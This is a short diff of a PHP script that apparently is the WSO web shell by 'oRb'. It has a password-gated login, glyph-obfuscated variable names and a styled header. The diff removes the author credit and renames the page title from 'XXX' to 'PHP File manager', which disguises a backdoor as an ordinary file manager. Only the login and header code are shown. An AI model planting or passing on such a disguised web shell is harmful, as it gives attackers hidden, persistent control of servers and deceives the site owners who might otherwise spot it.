@@ -30,7 +30,7 @@ if(get_magic_quotes_gpc()) {
     $_POST = stripslashes_array($_POST); 
     $_COOKIE = stripslashes_array($_COOKIE); 
 } 
-/* (С) 11.2011 oRb */ 
+/* File manager 2020 */ 
 if(!empty($▛)) { 
     if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛)) 
         prototype(md5($_SERVER['HTTP_HOST']), $▛); 
@@ -71,7 +71,7 @@ if($cwd[strlen($cwd)-1] != '/')
 function hardHeader() { 
     if(empty($_POST['charset'])) 
         $_POST['charset'] = $GLOBALS['▜']; 
-    echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - XXX " . VERSION ."</title> 
+    echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - PHP File manager " . VERSION ."</title> 
 <style> 
     body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;} 
     #particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;} 
